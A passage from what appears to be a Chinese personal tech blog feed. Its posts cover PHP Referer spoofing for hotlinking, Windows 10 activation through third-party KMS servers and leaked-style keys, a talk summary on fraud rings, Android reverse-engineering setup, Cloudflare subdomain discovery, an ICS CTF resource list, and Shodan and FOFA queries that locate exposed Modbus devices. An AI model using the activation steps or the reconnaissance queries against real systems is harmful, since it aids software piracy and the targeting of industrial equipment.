<p>但是用火狐修改请求头，添加Referer: <a href="https://www.58pic.com/c/1599016">https://www.58pic.com/c/1599016</a> 之后就可以正常显示啦<br><img src="/posts/324f26fd/%E7%81%AB%E7%8B%90%E4%BF%AE%E6%94%B9Referer.png" alt="火狐修改Referer.png"></p>
<h2 id="php伪造Referer"><a href="#php伪造Referer" class="headerlink" title="php伪造Referer"></a>php伪造Referer</h2><p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//$img_url=$_GET[&#x27;img_url&#x27;];</span></span><br><span class="line"><span class="variable">$img_url</span>=<span class="string">&quot;http://pic.qiantucdn.com/58pic/34/81/68/43g58PIC9ZK2GIjdy4Nff_PIC2018.jpg&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type: image/jpeg&#x27;</span>);</span><br><span class="line"><span class="variable">$context</span>=<span class="keyword">array</span>(<span class="string">&#x27;http&#x27;</span> =&gt; <span class="keyword">array</span> (<span class="string">&#x27;header&#x27;</span>=&gt; <span class="string">&#x27;Referer: https://www.58pic.com/c/1599016&#x27;</span>,),);</span><br><span class="line"><span class="variable">$xcontext</span> = <span class="title function_ invoke__">stream_context_create</span>(<span class="variable">$context</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$img_url</span>,<span class="literal">FALSE</span>,<span class="variable">$xcontext</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>语言学习</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>develop</tag>
      </tags>
  </entry>
  <entry>
    <title>win10家庭（中文）版升级专业版小记</title>
    <url>/posts/e230d586.html</url>
    <content><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>很多购买的电脑预装一般是Windows10家庭版，其中最常见的就是家庭中文版，查看方式鼠标<strong>右键点击桌面–&gt;此电脑–&gt;属性</strong>或者资源管理器输入<strong>控制面板\系统和安全\系统</strong>，如下图所示</p>
<span id="more"></span>

<p><img src="/posts/e230d586/image-20200630185530514.png" alt="image-20200630185530514"></p>
<p>那么话不多说，开始步骤</p>
<p>主要分为三步，<strong>家庭中文版–&gt;企业版–&gt;专业版并激活</strong></p>
<h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>首先更改Windows产品秘钥</p>
<p><img src="/posts/e230d586/image-20200630190015083.png" alt="image-20200630190015083"></p>
<p>企业版秘钥：<strong>NPPR9-FWDCX-D2C8J-H872K-2YT43</strong></p>
<p>等待更新完成，系统就会变为企业版</p>
<p>(ps：如果提示失败不用管，直接重启电脑，再更新就变成企业版了)</p>
<h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p>管理员权限运行CMD窗口</p>
<p>输入</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">slmgr /ipk VMT3B-G4NYC-M27X9-PTJVV-PWF9G</span><br><span class="line">slmgr /ipk kms.iakie.com</span><br><span class="line">slmgr /ato</span><br></pre></td></tr></table></figure>

<ol>
<li>如果上面秘钥失效，可以替换</li>
</ol>
<p>win10专业版密钥：CJW7T-X9N76-X3QCM-P3QJ7-FJRC6</p>
<p>win10专业版密钥：TPYNC-4J6KF-4B4GP-2HD89-7XMP6</p>
<p>win10专业版密钥：NRTT2-86GJM-T969G-8BCBH-BDWXG</p>
<p>win10专业版密钥：NXRQM-CXV6P-PBGVJ-293T4-R3KTY</p>
<p>win10专业版密钥：DR9VN-GF3CR-RCWT2-H7TR8-82QGT</p>
<p>win10专业版密钥：NJ4MX-VQQ7Q-FP3DB-VDGHX-7XM87</p>
<p>win10专业版密钥：NCXF8-K94KP-39F72-JK8D2-9QBP6</p>
<ol start="2">
<li>如果kms.iakie.com无法通信，可更换为kms.moerats.com</li>
</ol>
<h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><p>第二步可以下载脚本激活，甚至可以一句话激活</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">slmgr /skms kms.iakie.com &amp;&amp; slmgr /ato</span><br></pre></td></tr></table></figure>

<p>也可以点击这里<a href="https://kms.iakie.com/">kms.iakie.com</a>  下载激活脚本（ps：如果上边的都不好使）</p>
]]></content>
      <categories>
        <category>折腾搞机</category>
      </categories>
      <tags>
        <tag>升级win10专业版</tag>
        <tag>win10家庭版开启远程桌面</tag>
        <tag>kms</tag>
      </tags>
  </entry>
  <entry>
    <title>业务安全-黑灰产对抗小记</title>
    <url>/posts/8df56b4f.html</url>
    <content><![CDATA[<p>看了字节沙龙梁家辉师傅《黑灰产对抗实践与思考》主题分享，学到了很多风控方面的知识，特此记录一下（ps：不然我的脑子指定记不住）。内容加了一些自己的经验，不一定对，希望各位大侠多多批评指正。</p>
<h3 id="黑灰产介绍"><a href="#黑灰产介绍" class="headerlink" title="黑灰产介绍"></a>黑灰产介绍</h3><h4 id="引流变现"><a href="#引流变现" class="headerlink" title="引流变现"></a>引流变现</h4><ul>
<li><p>通过改机工具，虚拟定位软件进行热点引流（如定位不同地区，展示给附近的人）</p>
</li>
<li><p>通过平台的评论、直播等功能引流（如h色擦边球文字，头像，直播内容）</p>
<p>高级一点的会二次售卖引流技术（如一些引流话术），深度变现</p>
</li>
</ul>
<h4 id="薅羊毛-x2F-搬运工"><a href="#薅羊毛-x2F-搬运工" class="headerlink" title="薅羊毛&#x2F;搬运工"></a>薅羊毛&#x2F;搬运工</h4><ul>
<li><p>通过平台的推广拉新活动、现金补贴（大部分是逻辑漏洞，常见的有条件竞争漏洞，场景主要是在签到、积分、抽奖、优惠券、订单生成&#x2F;取消等）</p>
</li>
<li><p>常见于各大视频平台，对于优质视频的采集搬运（所以经常会见到b站、抖音、快手等有重复视频，甚至有的视频原作者播放量还没有搬运账号高）搬运工主要通过视频采集工具批量采集，一键去水印、拼接，短时间可以产生大量视频，并积累大量粉丝。</p>
<p>扯一句，造成的影响是很大的，特别是会降低原创作者的收益、积极性，长期如此，劣币驱逐良币，平台用户也会发生流失。</p>
</li>
</ul>
<h4 id="刷量作弊"><a href="#刷量作弊" class="headerlink" title="刷量作弊"></a>刷量作弊</h4><ul>
<li>刷粉丝（各大平台均会出现）</li>
<li>刷点赞（朋友圈点赞、公众号留言点赞、视频文章评论等点赞）</li>
<li>刷播放量（常见于最近火的短视频平台）</li>
<li>刷好评&#x2F;刷销量 （常见于电商平台，不过现在外卖、餐饮，旅游等面向C端用户的平台也越来越多。手段也太多先不详细写了）</li>
</ul>
<p><img src="/posts/8df56b4f/%E7%BE%8A%E6%AF%9B%E5%85%9A.png" alt="羊毛党"></p>
<h3 id="经典案例（1）"><a href="#经典案例（1）" class="headerlink" title="经典案例（1）"></a>经典案例（1）</h3><h4 id="常见手法"><a href="#常见手法" class="headerlink" title="常见手法"></a>常见手法</h4><ul>
<li><p>羊毛党通过改机软件等多次参与新用户活动、批量注册</p>
</li>
<li><p>刷量众包（发布任务，接受任务，常见有赞、关注、评论、收藏及分享等操作截图反馈，获得一定积分，可以提现；还有最近几年那种发展下线（带徒弟）获得分红的模式）</p>
<p>低级一点的是加好友微信朋友圈发布任务、建立线报群，高级点的使用众包平台，目的大多是为了快速打造热门账号。</p>
<p>其中也少不了一些专门制作刷量脚本、众包平台app的人员</p>
</li>
</ul>
<h4 id="对抗思路"><a href="#对抗思路" class="headerlink" title="对抗思路"></a>对抗思路</h4><ul>
<li>App前后台切换频次</li>
<li>截图动作监控</li>
<li>众包App检测</li>
</ul>
<h3 id="经典案例（2）"><a href="#经典案例（2）" class="headerlink" title="经典案例（2）"></a>经典案例（2）</h3><h4 id="常见手法-1"><a href="#常见手法-1" class="headerlink" title="常见手法"></a>常见手法</h4><p>骗子直播使用软件伪造微信虚假支付操作、故意不小心漏出钱包金额装富豪诱导打赏（其实都是ps截图之类的）</p>
<h4 id="舆论影响"><a href="#舆论影响" class="headerlink" title="舆论影响"></a>舆论影响</h4><ul>
<li><p>直播打赏诈骗现象投诉</p>
</li>
<li><p>用户到工商监控部门的投诉</p>
<p>最终会影响用户对平台的好感度，影响用户留存</p>
</li>
</ul>
<h4 id="对抗思路-1"><a href="#对抗思路-1" class="headerlink" title="对抗思路"></a>对抗思路</h4><ul>
<li>提升图像、文本等的识别能力</li>
<li>平台加强处罚力度</li>
</ul>
<h3 id="经典案例（3）"><a href="#经典案例（3）" class="headerlink" title="经典案例（3）"></a>经典案例（3）</h3><h4 id="常见手法-2"><a href="#常见手法-2" class="headerlink" title="常见手法"></a>常见手法</h4><ul>
<li>使用<strong>场控</strong>软件，常见于直播间，自动与用户进行互动，如入场回复、礼物回复、关注回复等等</li>
<li>使用虚拟定位，白天在国内直播，晚上就出国直播，哪里热门就定位到哪儿直播</li>
</ul>
<h4 id="对抗思路-2"><a href="#对抗思路-2" class="headerlink" title="对抗思路"></a>对抗思路</h4><ul>
<li>GPS位置篡改检查</li>
<li>IP代理检查</li>
<li>APK重打包检查</li>
<li>根据历史地理位置，对当前定位的位置进行合法性判断</li>
</ul>
<h3 id="黑产对抗总结"><a href="#黑产对抗总结" class="headerlink" title="黑产对抗总结"></a>黑产对抗总结</h3><ul>
<li>攻击方–&gt;搜索攻击目标–&gt;作弊团伙集结–&gt;黑产疯狂进攻–&gt;花式变现，愿者上钩</li>
<li>防守方–&gt;感知作弊风险–&gt;风控火力准备–&gt;风控组网截击–&gt;风控围追堵截</li>
</ul>
<p>未完，待续~</p>
<h3 id="推荐阅读"><a href="#推荐阅读" class="headerlink" title="推荐阅读"></a>推荐阅读</h3><p><a href="https://live.freebuf.com/activity/eb981fa6807c1211d0728dd54728225a/l_aea3958ff2d31b22506e6f78166c8147">字节跳动X安全范儿《业务安全 攻与防》</a></p>
<p><a href="https://tech.qq.com/a/20190123/002352.htm">深网丨猫池、撞库、伪基站，拼多多薅羊毛事件背后的千亿黑产网络</a></p>
]]></content>
      <categories>
        <category>业务安全</category>
      </categories>
      <tags>
        <tag>薅羊毛</tag>
        <tag>黑灰产</tag>
        <tag>业务安全</tag>
        <tag>科普</tag>
        <tag>风控相关</tag>
      </tags>
  </entry>
  <entry>
    <title>使用vdexExtractor将vdex文件转为dex</title>
    <url>/posts/1d39133b.html</url>
    <content><![CDATA[<h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h2><p>使用的系统版本ubuntu14.04</p>
<span id="more"></span>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/anestisb/vdexExtractor</span><br><span class="line"><span class="built_in">cd</span> vdexExtractor</span><br><span class="line">bash make.sh</span><br></pre></td></tr></table></figure>

<p>这时会在bin&#x2F;下生成可执行文件vdexExtractor<br><img src="/posts/1d39133b/360%E6%88%AA%E5%9B%BE-6499875.png" alt="360截图-6499875.png"></p>
<h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>接下来新建两个文件夹分别存放vdex文件和将要生成的dex文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> vdex</span><br><span class="line"><span class="built_in">mkdir</span> dex</span><br><span class="line"><span class="built_in">mv</span> NBGalleryLockScreen_classes.vdex vdex</span><br><span class="line">./vdexExtractor -i vdex -o dex</span><br></pre></td></tr></table></figure>


<p><img src="/posts/1d39133b/360%E6%88%AA%E5%9B%BE-6648140.png" alt="360截图-6648140.png"></p>
<h2 id="一些注意"><a href="#一些注意" class="headerlink" title="一些注意"></a>一些注意</h2><p>我这次是对nubia z18(Android 8.1)中的锁屏画报进行提取<br>最后会在dex文件夹下生成NBGalleryLockScreen_classes.dex文件<br><img src="/posts/1d39133b/360%E6%88%AA%E5%9B%BE-6893750.png" alt="360截图-6893750.png"></p>
<p>所有文件打包<br>链接: <a href="https://pan.baidu.com/s/1bLtSZKUxN-jgF4LyYD6zow">https://pan.baidu.com/s/1bLtSZKUxN-jgF4LyYD6zow</a> 提取码: 774b </p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>利用Cloudflare快速发现子域名</title>
    <url>/posts/bc8b27aa.html</url>
    <content><![CDATA[<p>使用Cloudflave的时候发现了这个小技巧，可以快速挖掘网站子域名。废话不多说，直接开始：</p>
<span id="more"></span>

<h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><p>进入<a href="https://dash.cloudflare.com/sign-up?lang=zh-cn">官网</a>注册，只需要邮箱验证就可以</p>
<p><img src="/posts/bc8b27aa/image-20200615155149028.png" alt="image-20200615155149028"></p>
<h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><p>注册完成后登陆，点击添加站点，以京东域名为例，jd.com</p>
<p><img src="/posts/bc8b27aa/image-20200615170505846.png" alt="image-20200615170505846"></p>
<h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h4><p>选择Free计划，0美元&#x2F;月，点击确认计划</p>
<p><img src="/posts/bc8b27aa/image-20200615170629077.png" alt="image-20200615170629077"></p>
<p>就可以看到Cloudflave会开始检索DNS记录，速度非常快，大概5秒</p>
<p><img src="/posts/bc8b27aa/image-20200615171500500.png" alt="image-20200615171500500"></p>
<p>检索完成后，页面将展示所有的子域名解析情况</p>
<p><img src="/posts/bc8b27aa/image-20200615171747606.png" alt="image-20200615171747606"></p>
<p><img src="/posts/bc8b27aa/image-20200615171823722.png" alt="image-20200615171823722"></p>
<p><img src="/posts/bc8b27aa/image-20200615171916985.png" alt="image-20200615171916985"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>子域名</tag>
        <tag>Cloudflare</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓模拟器与xposed框架相关小记</title>
    <url>/posts/bf0c81ff.html</url>
    <content><![CDATA[<h2 id="xposed下载"><a href="#xposed下载" class="headerlink" title="xposed下载"></a>xposed下载</h2><p>按照安卓版本下载Xposed的apk安装包，下载地址：</p>
<p>For Android 4.0.3 up to Android 4.4.x<br><a href="http://repo.xposed.info/module/de.robv.android.xposed.installer">http://repo.xposed.info/module/de.robv.android.xposed.installer</a></p>
<p>For Android 5.0 or higher (Lollipop&#x2F;Marshmallow)<br><a href="http://forum.xda-developers.com/showthread.php?t=3034811">http://forum.xda-developers.com/showthread.php?t=3034811</a></p>
<p>百度网盘备份<br>4.42安卓模拟器Xposed框架链接：</p>
<p><a href="https://pan.baidu.com/s/1depSSHCy0KYcFZzkPH7aZQ">https://pan.baidu.com/s/1depSSHCy0KYcFZzkPH7aZQ</a> 密码: vmyr</p>
<p>5.11安卓模拟器Xposed框架链接：</p>
<p><a href="https://pan.baidu.com/s/1erZD4gMk1MQdVklnrmSuLg">https://pan.baidu.com/s/1erZD4gMk1MQdVklnrmSuLg</a> 密码: s4j4</p>
<h2 id="夜神安卓模拟器"><a href="#夜神安卓模拟器" class="headerlink" title="夜神安卓模拟器"></a>夜神安卓模拟器</h2><p>默认没有开启Root  要手动开启 选择上边那个 一步一步装就好</p>
<h2 id="网易mumu模拟器"><a href="#网易mumu模拟器" class="headerlink" title="网易mumu模拟器"></a>网易mumu模拟器</h2><p>默认开启Root 不用手动开启 网易的是Android6.0所以选择下边这个</p>
<p>安装APK之前 先点击设置—&gt;应用兼容性—&gt;关闭</p>
<p>安装APK之后 打开 点击下载安装 按照提示给与root权限 若没有提示 重开几次就好了</p>
<p>如果不关闭应用兼容性<br>会产生问题：&#x2F;data&#x2F;data&#x2F;de.robv.android.xposed.install&#x2F;cache&#x2F;update-binary:not<br>executable:32bit ELF file Error 1 occurred</p>
<h2 id="蓝叠模拟器"><a href="#蓝叠模拟器" class="headerlink" title="蓝叠模拟器"></a>蓝叠模拟器</h2><p>支持arm架构APP安装</p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Xposed</tag>
      </tags>
  </entry>
  <entry>
    <title>使用云函数和企业微信搭建专属Server酱通知</title>
    <url>/posts/50818ca6.html</url>
    <content><![CDATA[<p>work-weixin-msg-sever-api项目可以用来制作自己的专属”Server酱”</p>
<p>原教程使用云开发和云函数方式部署，感觉有点小麻烦</p>
<p>实践发现其实直接用云函数加上API网关触发器就可以达到效果</p>
<span id="more"></span>

<p>本文以腾讯云函数为例，大致步骤为创建云函数，上传代码，创建触发器</p>
<h2 id="创建云函数"><a href="#创建云函数" class="headerlink" title="创建云函数"></a>创建云函数</h2><p>点击这个<a href="https://console.cloud.tencent.com/scf/list">网址</a>或者打开腾讯云官网搜索云函数进入控制台，按照下图配置：</p>
<p><img src="/posts/50818ca6/image-20210409190538015.png" alt="image-20210409190538015"></p>
<p>本地上传文件夹需要先把项目克隆到本地，再选中文件夹上传就好</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 不太稳定</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zhheo/work-weixin-msg-sever-api</span><br><span class="line"><span class="comment"># 若速度太慢，可使用</span></span><br><span class="line">git <span class="built_in">clone</span> https://hub.njuu.cf/zhheo/work-weixin-msg-sever-api</span><br></pre></td></tr></table></figure>

<p>上传完成，会显示压缩完成，然后点击完成</p>
<h2 id="创建API网关触发器"><a href="#创建API网关触发器" class="headerlink" title="创建API网关触发器"></a>创建API网关触发器</h2><p>点击触发管理，创建触发器，选择API网关触发，取消集成响应，然后提交。如下图所示：</p>
<p><img src="/posts/50818ca6/image-20210409190834397.png" alt="image-20210409190834397"></p>
<p>提交后会得到访问路径，如下图所示：</p>
<p><img src="/posts/50818ca6/image-20210409191129132.png" alt="image-20210409191129132"></p>
<p>使用企业微信给微信发送消息的API就制作完成啦!</p>
<h2 id="测试使用"><a href="#测试使用" class="headerlink" title="测试使用"></a>测试使用</h2><p>使用get请求，添加以下四个必要参数，拼接url即可</p>
<h3 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h3><p>GET</p>
<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><table>
<thead>
<tr>
<th>参数</th>
<th>类型</th>
<th>必选</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>str</td>
<td>true</td>
<td>企业微信公司id</td>
</tr>
<tr>
<td>secert</td>
<td>str</td>
<td>true</td>
<td>企业微信应用的应用secert</td>
</tr>
<tr>
<td>agentId</td>
<td>int</td>
<td>true</td>
<td>企业微信应用的应用agentId</td>
</tr>
<tr>
<td>msg</td>
<td>str</td>
<td>true</td>
<td>需要发送的内容</td>
</tr>
</tbody></table>
<h3 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h3><p><a href="https://service-xxx.sh.apigw.tencentcs.com/release/work-weixin/?id=xxx&amp;secert=xxx&amp;agentId=xxx&amp;msg=123">https://service-xxx.sh.apigw.tencentcs.com/release/work-weixin/?id=xxx&amp;secert=xxx&amp;agentId=xxx&amp;msg=123</a></p>
<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><p>Q：使用时一直提示缺少参数，怎么办？</p>
<p>A：注意参数名大小写，路径是否有其他字符，例如agentId不要敲成agentid。</p>
]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
      <tags>
        <tag>云函数</tag>
        <tag>Serve酱</tag>
      </tags>
  </entry>
  <entry>
    <title>工控安全CTF入门小记</title>
    <url>/posts/2a4195cc.html</url>
    <content><![CDATA[<p>工控安全细分领域的CTF比赛资料汇总</p>
<span id="more"></span>

<h3 id="知识库"><a href="#知识库" class="headerlink" title="知识库"></a>知识库</h3><p>工控安全入门分析</p>
<p><a href="https://www.anquanke.com/post/id/82383">https://www.anquanke.com/post/id/82383</a></p>
<p>工控安全基础概念初探</p>
<p><a href="http://blog.b3ale.cn/2020/06/24/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E5%88%9D%E6%8E%A2/">http://blog.b3ale.cn/2020/06/24/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E5%88%9D%E6%8E%A2/</a></p>
<p>ICS_CTF Contest</p>
<p><a href="https://ctf-wiki.github.io/ctf-wiki/ics/ctfs-zh/">https://ctf-wiki.github.io/ctf-wiki/ics/ctfs-zh/</a></p>
<p>工控安全-Freebuf</p>
<p><a href="https://search.freebuf.com/search/?search=%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8#article">https://search.freebuf.com/search/?search=%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8#article</a></p>
<p>工控安全系列文章</p>
<p><a href="https://www.anquanke.com/member/141205">https://www.anquanke.com/member/141205</a></p>
<p>深度解析工控网络流量特点</p>
<p><a href="https://www.freebuf.com/articles/ics-articles/167079.html">https://www.freebuf.com/articles/ics-articles/167079.html</a></p>
<p>工控CTF技能点学习总结</p>
<p><a href="https://zhuanlan.zhihu.com/p/93070821">https://zhuanlan.zhihu.com/p/93070821</a></p>
<p>Siemens PLC指纹提取方法汇总</p>
<p><a href="https://www.jianshu.com/p/75edadd2abbf">https://www.jianshu.com/p/75edadd2abbf</a></p>
<p>ZoomEye工控专题</p>
<p><a href="http://ics.zoomeye.org/"> http://ics.zoomeye.org/</a></p>
<p>Fofa工控专题</p>
<p><a href="https://fofa.so/subject">https://fofa.so/subject</a></p>
<h3 id="在线靶场"><a href="#在线靶场" class="headerlink" title="在线靶场"></a>在线靶场</h3><p>纵横网络靶场社区</p>
<p><a href="https://game.fengtaisec.com/">https://game.fengtaisec.com</a></p>
<h3 id="历届比赛真题"><a href="#历届比赛真题" class="headerlink" title="历届比赛真题"></a>历届比赛真题</h3><p>包括2018工业信息安全大赛、2019工业信息安全大赛、2018护网杯等题目</p>
<p><a href="https://github.com/ddyy0308/CTF">https://github.com/ddyy0308/CTF</a></p>
<h3 id="相关分析与WriteUp"><a href="#相关分析与WriteUp" class="headerlink" title="相关分析与WriteUp"></a>相关分析与WriteUp</h3><p>CTF工业信息安全大赛实践与分析</p>
<p><a href="https://www.freebuf.com/articles/ics-articles/210687.html">https://www.freebuf.com/articles/ics-articles/210687.html</a></p>
<p>一道MMS工控协议CTF题的WriteUp</p>
<p><a href="https://blog.csdn.net/cn_lyxc/article/details/94832631">https://blog.csdn.net/cn_lyxc/article/details/94832631</a></p>
<p>2018工业信息安全技能大赛华东赛区初赛</p>
<p><a href="https://www.cnblogs.com/bianmu-dadan/p/9414165.html">https://www.cnblogs.com/bianmu-dadan/p/9414165.html</a></p>
<p>老题新招 | 再解工控CTF流量分析题</p>
<p><a href="https://www.freebuf.com/articles/ics-articles/176868.html">https://www.freebuf.com/articles/ics-articles/176868.html</a></p>
<p>2019工业信息安全竞赛部分</p>
<p><a href="https://www.dazhuanlan.com/2019/12/30/5e09dcd470284/">https://www.dazhuanlan.com/2019/12/30/5e09dcd470284/</a></p>
<p>2019 工业信息安全竞赛总结</p>
<p><a href="https://www.cnpanda.net/ctf/415.html">https://www.cnpanda.net/ctf/415.html</a></p>
<p>由一道工控路由器固件逆向题目看命令执行漏洞</p>
<p><a href="https://www.anquanke.com/post/id/183202#h3-10">https://www.anquanke.com/post/id/183202#h3-10</a></p>
<h3 id="一些工具脚本"><a href="#一些工具脚本" class="headerlink" title="一些工具脚本"></a>一些工具脚本</h3><p>工控CTF比赛工具，各种网络数据包处理脚本</p>
<p><a href="https://github.com/NewBee119/ctf_ics_traffic">https://github.com/NewBee119/ctf_ics_traffic</a></p>
<p>分析工控网络流量的工具</p>
<p><a href="https://github.com/NewBee119/ICS-packets-Analyzer">https://github.com/NewBee119/ICS-packets-Analyzer</a></p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>一些好用的过滤条件</p>
<p>ip contains flag.txt</p>
<p>modbus&amp;&amp;modbus.func_code&#x3D;&#x3D;16</p>
<p>s7comm&amp;&amp;s7comm.param.func&#x3D;&#x3D;0x05</p>
<p>mms.confirmedServiceRequest&#x3D;&#x3D;73</p>
<h3 id="规律"><a href="#规律" class="headerlink" title="规律"></a>规律</h3><p>mms协议有关的流量分析题目，可以先搜索flag，png等关键字符串，如果检索不到可以尝试搜索对应的十六进制，比如666c（’fl’）</p>
<p>找到fileopen（72）对应的No.</p>
<p>接着使用这一条mms.confirmedServiceRequest&#x3D;&#x3D;73过滤fileread（73）操作的条目</p>
<p>观察那一条大于fileopen的No.</p>
<p>找到invokeID</p>
<p>接着找对应的mms.invokeID&#x3D;&#x3D;No.</p>
<p>会发现mms.confirmed_ResponsePDU，这个的十六进制值就存在flag内容</p>
]]></content>
      <categories>
        <category>工控安全</category>
        <category>CTF竞赛</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>工控安全</tag>
      </tags>
  </entry>
  <entry>
    <title>工控安全知识梳理</title>
    <url>/posts/bbe71824.html</url>
    <content><![CDATA[<h2 id="工业控制系统结构和场景"><a href="#工业控制系统结构和场景" class="headerlink" title="工业控制系统结构和场景"></a>工业控制系统结构和场景</h2><h3 id="系统结构"><a href="#系统结构" class="headerlink" title="系统结构"></a>系统结构</h3><p>• 传感器和执行器</p>
<p>• 可编程控制器（PLC）</p>
<p>• 工业网络与现场总线</p>
<p>• 工业计算机及工业组态软件</p>
<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>• 过程自动化系统<br>应用在流程行业，比如：石油，化工，医药,冶金,水处理<br>对应的控制系统：DCS (集散控制系统)居多,大型PLC为主,单台控制器I0点数多数在2000点以上,全冗余架构</p>
<p>• 工厂自动化控制系统<br>应用在离散行业，比如：汽车、港口，烟草<br>对应控制系统：主要以PLC为主，采用和设备捆绑为主，单台控制I0点数少于2000点，单机为主</p>
<h2 id="工业控制系统厂商和产品"><a href="#工业控制系统厂商和产品" class="headerlink" title="工业控制系统厂商和产品"></a>工业控制系统厂商和产品</h2><p>待更新···</p>
<h2 id="工业控制系统脆弱性分析"><a href="#工业控制系统脆弱性分析" class="headerlink" title="工业控制系统脆弱性分析"></a>工业控制系统脆弱性分析</h2><h3 id="工业控制协议漏洞"><a href="#工业控制协议漏洞" class="headerlink" title="工业控制协议漏洞"></a>工业控制协议漏洞</h3><p>• 所使用的工业控制协议缺乏身份认证<br>• 工业控制系统或所使用的协议缺乏授权机制<br>• 所使用的工业控制协议缺乏加密保护</p>
<h3 id="PLC代码逻辑漏洞"><a href="#PLC代码逻辑漏洞" class="headerlink" title="PLC代码逻辑漏洞"></a>PLC代码逻辑漏洞</h3><p>• 计算逻辑漏洞<br>• 看门狗超时时间<br>• 缓冲区溢出漏洞</p>
<h3 id="工业以太网链路漏洞"><a href="#工业以太网链路漏洞" class="headerlink" title="工业以太网链路漏洞"></a>工业以太网链路漏洞</h3><p>• MAC泛洪攻击<br>• ARP溢出&#x2F;中间人攻击<br>• 环网beacon协议协议攻击<br>• VLAN跳转攻击<br>• 交换机WEB漏洞攻击</p>
<h3 id="主机安全漏洞"><a href="#主机安全漏洞" class="headerlink" title="主机安全漏洞"></a>主机安全漏洞</h3><p>• 防火墙关闭<br>• 没有杀软防护<br>• 缺乏USB准入<br>• Windows本身 漏洞<br>• SMB v1.0 Port 445<br>• RDP Port 3389<br>• AD域攻击<br>• DNS污染攻击</p>
<h3 id="组态软件漏洞"><a href="#组态软件漏洞" class="headerlink" title="组态软件漏洞"></a>组态软件漏洞</h3><p>• DoS拒绝式服务攻击<br>• 缓冲器溢出漏洞<br>• COM服务组件未授权访问漏洞<br>• SQL数据库注入的漏洞</p>
<h3 id="物理安全漏洞"><a href="#物理安全漏洞" class="headerlink" title="物理安全漏洞"></a>物理安全漏洞</h3><p>• 设备所在地无防护<br>• 机房机柜未上锁<br>• 网络端口未加固<br>• 控制器钥匙未拔出<br>• 供电电源为单路<br>• 接地系统不完善</p>
<h2 id="工控资产指纹探测识别"><a href="#工控资产指纹探测识别" class="headerlink" title="工控资产指纹探测识别"></a>工控资产指纹探测识别</h2><p>常用方法有搜索引擎语法，NSE Scripts、ISF扫描模块、WireShark流量分析</p>
<h3 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h3><p>网络空间搜索引擎<br>相比于传统的搜索引擎，网络空间搜索引擎可以用来获取数以万计的各类资产信息，比如协议、硬件设备、操作系统等。比较常用的搜索引擎有shodan，fofa，zoomeye，Censys等搜索引擎，使用时需要构造对应的搜索引擎语法。以modbus协议设备为例，下面通过modbus协议固定的tcp端口号502、协议名称、服务名称分别演示：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># shodan</span><br><span class="line">port:502</span><br></pre></td></tr></table></figure>
<p><img src="/posts/bbe71824/1591856071943-1c9845dd-9409-4d81-b258-bfcf48deb98d.png" alt="1591856071943-1c9845dd-9409-4d81-b258-bfcf48deb98d.png"></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># fofa</span><br><span class="line">protocol==&quot;modbus&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/bbe71824/1591855896436-0ea8681c-6231-484f-bb6b-361605260397.png" alt="1591855896436-0ea8681c-6231-484f-bb6b-361605260397.png"></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># zoomeye</span><br><span class="line">service:&quot;Modbus&quot; +port:&quot;502&quot;</span><br></pre></td></tr></table></figure>
